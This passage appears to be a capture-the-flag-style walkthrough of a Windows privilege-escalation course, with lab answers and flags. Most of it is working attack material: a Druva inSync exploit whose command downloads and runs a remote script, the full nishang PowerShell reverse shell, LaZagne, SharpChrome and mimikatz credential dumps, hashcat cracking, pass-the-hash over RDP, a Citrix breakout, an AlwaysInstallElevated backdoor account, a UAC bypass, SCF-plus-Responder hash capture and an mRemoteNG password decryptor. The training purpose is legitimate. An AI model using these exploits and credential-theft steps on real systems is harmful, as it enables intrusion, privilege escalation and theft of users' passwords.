  TCP    127.0.0.1:52496        127.0.0.1:6064         ESTABLISHED     4084
```


Enumerating Process ID: Next, let's map the process ID (PID) 3468 back to the running process.

```powershell-session
get-process -Id 3324
```

Exaple of output:

```powershell-session
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    149      10     1512       6748              3324   0 inSyncCPHwnet64
```

Enumerating Running Service: At this point, we have enough information to determine that the Druva inSync application is indeed installed and running, but we can do one last check using the `Get-Service` cmdlet.

```powershell-session
get-service | ? {$_.DisplayName -like 'Druva*'}
```

The attack: What is interesting in this attack is that the  POC from  [https://www.exploit-db.com/exploits/49211](https://www.exploit-db.com/exploits/49211) for exploiting `Druva inSync Windows Client 6.6.3 - Local Privilege Escalation (PowerShell)` can load and execute a command from  memory, meaning not touching the disk.

We only need to modify the $cmd variable to our desired command. And our desired command will be downloading into memory the [Invoke-PowershellTcp.ps1 from nishang](nishang.md) to get a reverse shell without touching the disk.

First, we indicate in the PoC the command (see variable $cmd with our real IP and ). We will save the file as druva.ps1:

```powershell
$ErrorActionPreference = "Stop"

$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

Now we need to prepare the nishang Invoke-PowerShellTcp in our kali attacking machine. If we have a look at it we will see that it contains the function definition, but we also need to call it so by the end of our nishang Invoke-PowerShellTcp we will add the  line:

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.23 -Port 9443
```

And we will save it as shell.ps1.  This is the final shell.ps1:

```bash
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
.DESCRIPTION
This script is able to connect to a standard Netcat listening on a port when using the -Reverse switch. 
Also, a standard Netcat can connect to this script Bind to a specific port.
The script is derived from Powerfun written by Ben Turner & Dave Hardy
.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.
.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444
Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 
.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.23 -Port 9443
```


Now in our attacking machine we can serve the shell.ps1 file:

```shell-session
python3 -m http.server 8080
```

We also need a listener to catch the SYSTEM shell:

```shell-session
 nc -lvnp 9443
```

Now, we just run the PoC:

```powershell
.\druva.ps1
```

And we will obtain the reverse shell. We will print the flag:

```
type C:\Users\Administrator\Desktop\VulServices\flag.txt
```

**Results**: Aud1t_th0se_th1rd_paRty_s3rvices!


## Credential Theft

RDP to  with user "htb-student" and password "HTB_@cademy_stdnt!".  Search the file system for a file containing a password. Submit the password as your answer.

```
xfreerdp /v:10.129.42.144 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
```

After running:

```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

We obtain a lot of files with passwords, including  `document\stuff.txt` or `C:\Users\htb-student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

However we need to run the command from `C:\` to obtain the full picture. Then affected file is `C:\Users\Public\Documents`. 

**Results**: Pr0xyadm1nPassw0rd!


**RDP to  with user "bob" and password "Str0ng3ncryptedP@ss!". Connect as the bob user and practice decrypting the credentials in the pass.xml file. Submit the contents of the flag.txt on the desktop once you are done.**

```
xfreerdp /v:10.129.42.144 /u:bob /p:Str0ng3ncryptedP@ss! /cert:ignore
```

Results: 3ncryt10n_w0nt_4llw@ys_s@v3_y0u


**RDP to with user "htb-student" and password "HTB_@cademy_stdnt!". Using the techniques shown in this section, find the cleartext password for the bob_adm user on the target system.**

```
xfreerdp /v:10.129.42.144 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore

# Check if there is any database. Usually it's located at: `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`
dir 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\'
```

We will use the module [https://github.com/RamblingCookieMonster/PSSQLite](https://github.com/RamblingCookieMonster/PSSQLite): 

```powershell-session
Set-ExecutionPolicy Bypass -Scope Process

cd .\PSSQLite\
Import-Module .\PSSQLite.psd1

$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'

Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```

Output:

```

Text
----
\id=de368df0-6939-4579-8d38-0fda521c9bc4 vCenter
\id=e4adae4c-a40b-48b4-93a5-900247852f96
\id=1a44a631-6fff-4961-a4df-27898e9e1e65 root:Vc3nt3R_adm1n!
\id=c450fc5f-dc51-4412-b4ac-321fd41c522a Thycotic demo tomorrow at 10am
\id=e30f6663-29fa-465e-895c-b031e061a26a Network
\id=c73f29c3-64f8-4cfc-9421-f65c34b4c00e
\id=69b4fc18-ae09-4226-af90-175ff4092b79 bob_adm:1qazXSW@3edc!
```

Results: 1qazXSW@3edc!



**RDP to  with user "jordan" and password "HTB_@cademy_j0rdan!". Using the techniques covered in this section, retrieve the sa password for the SQL01.inlanefreight.local user account.**

```
xfreerdp /v:10.129.23.186 /u:jordan /p:HTB_@cademy_j0rdan! /cert:ignore

```

If we go to c:\Tools we can see that we have lazagne.exe at our disposal:

```
cd c:\Tools

.\lazagne.exe databases
```

And the output:

```

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

[+] System masterkey decrypted for c23eb53b-f1dd-47f6-b1e8-73e5446d9066
[+] System masterkey decrypted for f7122927-87cd-41bc-b786-3f70200efc94
[+] System masterkey decrypted for 1ef7b31a-39fd-4309-877e-c354d5a19506
[+] System masterkey decrypted for 6977da93-ec45-468e-8a19-97d9865fb2e6
[+] System masterkey decrypted for 59cae5c6-be85-4073-9a6c-94889ba71196

########## User: jordan ##########

------------------- Dbvis passwords -----------------

[+] Password found !!!
Name: SQL01.inlanefreight.local
Driver:
          SQL Server (Microsoft JDBC Driver)

Host: localhost
Login: sa
Password: S3cret_db_p@ssw0rd!
Port: 1433


[+] 1 passwords have been found.
For more information launch it again with the -v option

```

Results: S3cret_db_p@ssw0rd!





```
------------------- Winscp passwords -----------------

[+] Password found !!!
URL: transfer.inlanefreight.local
Login: root
Password: Summer2020!
Port: 22

```


```
whoami /priv
```

The user jordan has the SeDebugPrivilege enabled. `SeDebugPrivilege` allows you to interact with and inject into processes owned by other users, including SYSTEM. This privilege is often used for privilege escalation if you have the right tooling. And I do. We have mimikatz in C:\Tools

```
cd C:\Tools\Mimikatz\x64
.\mimikatz.exe

# Now in mimikatz:
privilege::debug
log creds.txt
sekurlsa::logonpasswords

```

Output:
```

Authentication Id : 0 ; 1348983 (00000000:00149577)
Session           : Interactive from 0
User Name         : sccm_svc
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 4/14/2025 11:16:12 AM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1012
        msv :
         [00000006] Primary
         * Username : sccm_svc
         * Domain   : WINLPE-SRV01
         * NTLM     : 64f12cddaa88057e06a81b54e73b949b
         * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8
        tspkg :
        wdigest :
         * Username : sccm_svc
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : sccm_svc
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
```

We can now use hashcat to extract the NTLM:

```
hashcat -m 1000 -a 0 64f12cddaa88057e06a81b54e73b949b  /usr/share/wordlists/rockyou.txt 
```

Now we have the user credentials:

```
sccm_svc:Password1
```

We can open a Powershell as that user and check our permissions with:

```
whoami /priv

whoami /groups
```

I can see that I'm part of the Administrator group. However I'm not **a full Local Administrator**, even though it looks like I'm part  of the `Administrators` group — but crucially, that membership is marked as "Group used for deny only", which means -I'm running a standard user token, even if I'm technically a member of the `Administrators` group. This is typical in User Account Control (UAC) environments, where admin rights are only granted when explicitly elevated (e.g. via Run as Administrator). So let's elevate privileges with:

```
Start-Process powershell -Verb runAs
```

In cmd this would be:

```
runas /user:Administrator cmd
```

And now we can use again mimikatz to dump all passwords:

```
cd C:\Tools\Mimikatz\x64
.\mimikatz.exe

# Now in mimikatz:
privilege::debug
token::elevate
lsadump::sam
```

And we will obtain:

```

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 7796ee39fd3a9c3a1844556115ae1a54

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000003e8 (1000)
User : jordan
  Hash NTLM: 30689ae6de22596f45afb9619f8e5fa0

RID  : 000003e9 (1001)
User : sarah
  Hash NTLM: cf3a5525ee9414229e66279623ed5c58
Welcome1 

RID  : 000003ea (1002)
User : helpdesk
  Hash NTLM: cf3a5525ee9414229e66279623ed5c58
Welcome1

RID  : 000003eb (1003)
User : secsvc
  Hash NTLM: cf3a5525ee9414229e66279623ed5c58
Welcome1

RID  : 000003ec (1004)
User : htb-student
  Hash NTLM: 3c0e5d303ec84884ad5c3b7876a06ea6

RID  : 000003ed (1005)
User : htb-student_adm
  Hash NTLM: cf3a5525ee9414229e66279623ed5c58
Welcome1


RID  : 000003f1 (1009)
User : sql_dev
  Hash NTLM: c1b1a60715be1bb3f9e5a03092029c0b

RID  : 000003f2 (1010)
User : logger
  Hash NTLM: 3c0e5d303ec84884ad5c3b7876a06ea6

RID  : 000003f4 (1012)
User : sccm_svc
  Hash NTLM: 64f12cddaa88057e06a81b54e73b949b
Password1

RID  : 000003f5 (1013)
User : mrb3n
  Hash NTLM: 7796ee39fd3a9c3a1844556115ae1a54

```

Now we can access as Administrator via RDP. For that, before closing the Administrator console we will modify the registry

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

And now we can connect via RDP and the NTLM hash:

```
xfreerdp /v:10.129.23.186 /u:Administrator /pth:7796ee39fd3a9c3a1844556115ae1a54 /cert:ignore
```



**RDP to  with user "htb-student" and password "HTB_@cademy_stdnt!". Which user has credentials stored for RDP access to the WEB01 host?**

```
xfreerdp /v:10.129.170.75 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
```

Open powershell and go to c:\Tools

```
.\lazagne.exe all
```

Output:

```
########## User: htb-student ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: ftp.ilfreight.local
Login: root
Password: Ftpuser!
Port: 22

------------------- Vault passwords -----------------

[-] Password not found !!!
URL: Domain:target=WEB01
Login: amanda


[+] 1 passwords have been found.
For more information launch it again with the -v option

```

**Results**: amanda


**RDP to  with user "htb-student" and password "HTB_@cademy_stdnt!".  Find and submit the password for the root user to access https://vc01.inlanefreight.local/ui/login**

```
xfreerdp /v:10.129.43.43 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
```

Open Powershell and go to c:\Tools:

```
.\SharpChrome.exe logins /unprotect
```

Output:

```
[X] Error : 0

---  Credential (Path: C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Login Data) ---

file_path,signon_realm,origin_url,date_created,times_used,username,password
C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Login Data,https://vc.inlanefreight.local/,https://vc.inlanefreight.local/ui/login,5/26/2021 12:09:51 PM,13266529791618996,root,"?U?1`?l}?????A
?"
C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Login Data,http://vc01.inlanefreight.local:443/,http://vc01.inlanefreight.local:443/login.html,8/7/2021 6:33:01 PM,13272859981246714,root,ILVCadm1n1qazZAQ!
```

**Results**: ILVCadm1n1qazZAQ!



 **RDP to  with user "htb-student" and password "HTB_@cademy_stdnt!". Enumerate the host and find the password for ftp.ilfreight.local**

```
xfreerdp /v:10.129.43.43 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
```

Open powershell and go to c:\Tools

```
.\lazagne.exe all
```

Output:

```
########## User: htb-student ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: ftp.ilfreight.local
Login: root
Password: Ftpuser!
Port: 22

------------------- Vault passwords -----------------

[-] Password not found !!!
URL: Domain:target=WEB01
Login: amanda


[+] 1 passwords have been found.
For more information launch it again with the -v option

```

**Results**: Ftpuser!

Other creds in the system:

```
# Located at c:\Department Shares\IT\cred.txt
NIX01 admin
root:n1X_p0wer_us3er!

# Located at c:\TakeOwn
1m_th3_f1l3_0wn3r_n0W!

# Running all modules of lazagne.exe with
.\lazagne.exe all
---------------- Winscp passwords -----------------

[+] Password found !!!
URL: transfer.inlanefreight.local
Login: root
Password: Summer2020!
Port: 22

# Under C:\Users\Administrator\Desktop\SeImpersonate\flag.txt
F3ar_th3_p0tato!

# By dumping files with password
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password|pwd|pass"
# We obtained: username="tomcat" password="s3cret"
```

## Restricted Environments


**RDP to  with user "htb-student" and password "HTB_@cademy_stdnt!". Submit the user flag from C:\Users\pmorgan\Downloads**

```
xfreerdp /v:10.129.205.244 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
```

Visit `http://humongousretail.com/remote/`. Enter with creds:

```citrixcredentials
Username: pmorgan
Password: Summer1Summer!
  Domain: htb.local
```

 After login, click on the `Default Desktop` to obtain the Citrix `launch.ica` file in order to connect to the restricted environment.

Run `Paint` from start menu and click on `File > Open` to open the Dialog Box.

With the windows dialog box open for paint, we can enter the [UNC](https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths) path `\\127.0.0.1\c$\users\pmorgan` under the File name field, with File-Type set to `All Files` and upon hitting enter we gain access to the desired directory.

There, right click on the flag.txt file and open it with the Note editor.

Results: CitR1X_Us3R_Esc@p3

**Submit the Administrator's flag from C:\Users\Administrator\Desktop**


```
# Entering to the windows citrix env, to return to Ubuntu use CTRL-Tab
# In ubuntu open a terminal
sudo su
cd /home/htb-student/Tools
```

tart a SMB server from the Ubuntu machine using Impacket's `smbserver.py` script.

```shell-session
smbserver.py -smb2support share $(pwd)
```

Back in the Citrix environment, initiate the "Paint" application via the start menu.

Within this Windows dialog box associated with Paint, input the UNC path as `\\10.13.38.95\share` into the designated "File name" field.

This is a file that we have hosted there: pwn.exe. This binary is the compiled binary from pwn.c:

```c
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```

We can then use the obtained cmd access to copy files from SMB share to pmorgans Desktop directory. Now we can:

```
powershell -ep bypass
cd c:\Users\pmorgan\Desktop
xcopy \\10.13.38.95\share\Bypass-UAC.ps1
xcopy \\10.13.38.95\share\PowerUp.ps1
xcopy \\10.13.38.95\share\pwn.exe
```


Even though without downloading these files, we could right-click the executable and get a cmd terminal. 

Once we access to the terminal, we can jump to Escalating privileges.


Using `PowerUp.ps1`, we find that [Always Install Elevated](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated) key is present and set.

We can also validate this using the Command Prompt by querying the corresponding registry keys:

```cmd-session
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```


Once more, we can make use of PowerUp, using it's `Write-UserAddMSI` function. This function facilitates the creation of an `.msi` file directly on the desktop.

```powershell-session
 Import-Module .\PowerUp.ps1
 Write-UserAddMSI
```

Output:

```powershell-session
Output Path
-----------
UserAdd.msi
```

Now we can execute `UserAdd.msi` and create a new user `backdoor:password123.` under Administrators group.

And:

```cmd-session
runas /user:backdoor cmd
```

For bypassing the UAC, we will use [Bypass-UAC.ps1](files/Bypass-UAC.ps1) from https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Bypass-UAC/Bypass-UAC.ps1:

```powershell-session
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```

Following a successful UAC bypass, a new powershell windows will be opened with higher privileges and we can confirm it by utilizing the command `whoami /all` or `whoami /priv`. 

```
type c:\Users\Administrator\Desktop\flag.txt
```

**Results**: C1tr!x_3sC@p3_@dm!n

## Additional Techniques

**RDP to  with user "htb-student" and password "HTB_@cademy_stdnt!". Using the techniques in this section obtain the cleartext credentials for the SCCM_SVC user.**

```
xfreerdp /v:10.129.113.114 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
```

```
[Shell]
Command=2
IconFile=\\10.10.15.105\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```


**1.** Create the file @Inventory.sfc:

```
[Shell]
Command=2
IconFile=\\$IPAttacker\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

**2**  Save it in a share:

```
# Enumerate the local shares:
Get-SmbShare
```

Output:

```
Name              ScopeName Path                 Description
----              --------- ----                 -----------
ADMIN$            *         C:\Windows           Remote Admin
C$                *         C:\                  Default share
Department Shares *         C:\Department Shares
IPC$              *                              Remote IPC
```

In this case we have write permissions on `C:\Department Shares\Public\IT` . We save there @Inventory.sfc.

**3.** Start responder in the attacker machine: 

```shell-session
sudo python3 ./Responder.py -I tun0  -w -d
```

We will get:

```
sccm_svc::WINLPE-SRV01:576fe5b6ae9591d2:70223F59AD1316DFAB43DCE951C6CA4D:010100000000000000738CE498B4DB015ABAFE6949AC79490000000002000800430050003400300001001E00570049004E002D0055005400320035004600550045004E0048005400530004003400570049004E002D0055005400320035004600550045004E004800540053002E0043005000340030002E004C004F00430041004C000300140043005000340030002E004C004F00430041004C000500140043005000340030002E004C004F00430041004C000700080000738CE498B4DB010600040002000000080030003000000000000000010000000020000020F8114B2C53009CEED83BBBC3895566AA9FF81A0BD7821F7C9DB139C50048080A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E00310030003500000000000000000000000000

```

We save it under name `hash`.

**3.** Cracking NTLMv2 Hash with Hashcat

```shell-session
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

**Results**: Password1


 **RDP to  with user "Peter" and password "Bambi123". Access the target machine using Peter's credentials and check which applications are installed. What's the application installed used to manage and connect to remote systems?**


```
xfreerdp /v:10.129.190.241 /u:Peter /p:Bambi123 /cert:ignore
```

```
# List existing programs
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation

$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation


$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```

Output (example):

```
DisplayName                                                        DisplayVersion  InstallLocation
-----------                                                        --------------  ---------------
DB Browser for SQLite                                              3.12.2          C:\Program Files\DB Browser for SQLite\
Google Chrome                                                      105.0.5195.127  C:\Program 
... SNIP ...

mRemoteNG                                                          1.76.20.24615   C:\Program Files (x86)\mRemoteNG\
Slack (Machine - MSI)                                              4.27.154.0

... SNIP ...
```

We can see the `mRemoteNG` software is installed on the system. 

**Results**: mRemoteNG

**Find the configuration file for the application you identify and attempt to obtain the credentials for the user Grace. What is the password for the local account, Grace?**

```
# Access the mRemoteNG config file:
cd C:\Users\Peter\AppData\Roaming\mRemoteNG
type confCons.xml
```

mRemoteNG Configuration File - confCons.xml:

```xml
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389"
    ..SNIP..
</Connections>
```

This XML document contains a root element called `Connections` with the information about the encryption used for the credentials and the attribute `Protected`, which corresponds to the master password used to encrypt the document.

We can use this string to attempt to crack the master password. We will find some elements named `Node` within the root element.

```xml
<?xml version="1.0" encoding="UTF-8"?>

[<mrng:Connections ConfVersion="2.6" Protected="AllGNAWw3JJdXFuMG06ssHKpMbWw7AHXKWZVidfNIu5LNVm2nzroKSKtYYfsK66/itwh95OaYLtEX8NA7xy7IMwr" FullFileEncryption="false" KdfIterations="1000" BlockCipherMode="GCM" EncryptionEngine="AES" Export="false" Name="Connections" xmlns:mrng="http://mremoteng.org">](file:///C:/Users/Peter/AppData/Roaming/mRemoteNG/confCons.xml#)
<Node Name="Grace_Local_Acct" InheritRDGatewayDomain="false" InheritRDGatewayPassword="false" InheritRDGatewayUsername="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayHostname="false" InheritRDGatewayUsageMethod="false" InheritVNCViewOnly="false" InheritVNCSmartSizeMode="false" InheritVNCColors="false" InheritVNCProxyPassword="false" InheritVNCProxyUsername="false" InheritVNCProxyPort="false" InheritVNCProxyIP="false" InheritVNCProxyType="false" InheritVNCAuthMode="false" InheritVNCEncoding="false" InheritVNCCompression="false" InheritExtApp="false" InheritUserField="false" InheritMacAddress="false" InheritPostExtApp="false" InheritPreExtApp="false" InheritLoadBalanceInfo="false" InheritRDPAlertIdleTimeout="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAuthenticationLevel="false" InheritICAEncryptionStrength="false" InheritUsername="false" InheritRenderingEngine="false" InheritUseCredSsp="false" InheritUseConsoleSession="false" InheritAutomaticResize="false" InheritResolution="false" InheritSoundQuality="false" InheritRedirectSound="false" InheritRedirectSmartCards="false" InheritRedirectPrinters="false" InheritRedirectPorts="false" InheritRedirectKeys="false" InheritRedirectDiskDrives="false" InheritPuttySession="false" InheritProtocol="false" InheritPort="false" InheritPassword="false" InheritPanel="false" InheritIcon="false" InheritDomain="false" InheritEnableDesktopComposition="false" InheritEnableFontSmoothing="false" InheritDisplayWallpaper="false" InheritDisplayThemes="false" InheritDescription="false" InheritColors="false" InheritCacheBitmaps="false" RDGatewayDomain="" RDGatewayPassword="" RDGatewayUsername="" RDGatewayUseConnectionCredentials="Yes" RDGatewayHostname="" RDGatewayUsageMethod="Never" VNCViewOnly="false" VNCSmartSizeMode="SmartSAspect" VNCColors="ColNormal" VNCProxyPassword="" VNCProxyUsername="" VNCProxyPort="0" VNCProxyIP="" VNCProxyType="ProxyNone" VNCAuthMode="AuthVNC" VNCEncoding="EncHextile" VNCCompression="CompNone" ExtApp="" UserField="" MacAddress="" PostExtApp="" PreExtApp="" Connected="false" RedirectKeys="false" SoundQuality="Dynamic" RedirectSound="DoNotPlay" RedirectSmartCards="false" RedirectPrinters="false" RedirectPorts="false" RedirectDiskDrives="false" CacheBitmaps="false" EnableDesktopComposition="false" EnableFontSmoothing="false" DisplayThemes="false" DisplayWallpaper="false" AutomaticResize="true" Resolution="FitToWindow" Colors="Colors16Bit" LoadBalanceInfo="" RDPAlertIdleTimeout="false" RDPMinutesToIdleTimeout="0" RDPAuthenticationLevel="NoAuth" ICAEncryptionStrength="EncrBasic" RenderingEngine="IE" UseCredSsp="true" ConnectToConsole="false" Port="3389" PuttySession="Default Settings" Protocol="RDP" Hostname="localhost" Password="s1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLTz0aSNjRjr3Rilf6Xb4XQ=" Domain="PILLAGING-WIN01" Username="grace" Id="88291c0c-b6b0-4f2d-b180-81d3b50485a4" Panel="General" Icon="mRemoteNG" Descr="Grace Account" Type="Connection"/></mrng:Connections>
```


We can use this string to attempt to crack the master password. We will find some elements named `Node` within the root element. Those nodes contain details about the remote system, such as username, domain, hostname, protocol, and password. All fields are plaintext except the password, which is encrypted with the master password.

We will use the script [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) to decrypt the password:

```python
#!/usr/bin/env python3

import hashlib
import base64
from Cryptodome.Cipher import AES
import argparse
import sys

def main():
  parser = argparse.ArgumentParser(description="Decrypt mRemoteNG passwords.")
  group = parser.add_mutually_exclusive_group()
  group.add_argument("-f", "--file", help="name of file containing mRemoteNG password")
  group.add_argument("-s", "--string", help="base64 string of mRemoteNG password")
  parser.add_argument("-p", "--password", help="Custom password", default="mR3m")

  if len(sys.argv) < 2:
    parser.print_help(sys.stderr)
    sys.exit(1)

  args = parser.parse_args()
  encrypted_data = ""
  if args.file != None:
    with open(args.file) as f:
      encrypted_data = f.read()
      encrypted_data = encrypted_data.strip()
      encrypted_data = base64.b64decode(encrypted_data)

  elif args.string != None:
    encrypted_data = args.string
    encrypted_data = base64.b64decode(encrypted_data)

  else:
    print("Please use either the file (-f, --file) or string (-s, --string) flag")
    sys.exit(1)

  salt = encrypted_data[:16]
  associated_data = encrypted_data[:16]
  nonce = encrypted_data[16:32]
  ciphertext = encrypted_data[32:-16]
  tag = encrypted_data[-16:]
  key = hashlib.pbkdf2_hmac("sha1", args.password.encode(), salt, 1000, dklen=32)

  cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
  cipher.update(associated_data)
  plaintext = cipher.decrypt_and_verify(ciphertext, tag)
  print("Password: {}".format(plaintext.decode("utf-8")))

if __name__ == "__main__":
  main()
```

We will clone it:

```
https://github.com/haseebT/mremoteng-decrypt-1.git

cd mremoteng-decrypt
```

```bash
# Access our environment:
activate tooling

# Save the credentials to a file 
echo "s1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLTz0aSNjRjr3Rilf6Xb4XQ=" > file.txt
```

And run the script:

```
python3 mremoteng_decrypt.py -f file.txt
```

Output: 
```
Password: Princess01!
```

**Results**: Princess01!


